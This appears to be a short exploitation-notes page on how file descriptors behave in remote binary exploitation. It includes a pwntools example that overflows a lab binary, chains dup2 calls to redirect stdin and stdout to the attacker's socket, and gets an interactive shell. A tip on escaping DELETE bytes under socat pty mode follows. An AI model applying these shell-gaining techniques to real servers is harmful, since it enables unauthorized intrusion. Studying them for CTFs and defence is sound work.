## FDs in Remote Exploitation

When sending an exploit to a remote server that calls **`system('/bin/sh')`** for example, this will be executed in the server process ofc, and `/bin/sh` will expect input from stdin (FD: `0`) and will print the output in stdout and stderr (FDs `1` and `2`). So the attacker won't be able to interact with the shell.

A way to fix this is to suppose that when the server started it created the **FD number `3`** (for listening) and that then, your connection is going to be in the **FD number `4`**. Therefore, it's possible to use the syscall **`dup2`** to duplicate the stdin (FD 0) and the stdout (FD 1) in the FD 4 (the one of the connection of the attacker) so it'll make feasible to contact the shell once it's executed.

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```

## Socat & pty

Note that socat already transfers `stdin` and `stdout` to the socket. However, the `pty` mode **include DELETE characters**. So, if you send a `\x7f` ( `DELETE` -)it will **delete the previous character** of your exploit.

In order to bypass this the **escape character `\x16` must be prepended to any `\x7f` sent.**

**Here you can** [**find an example of this behaviour**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**
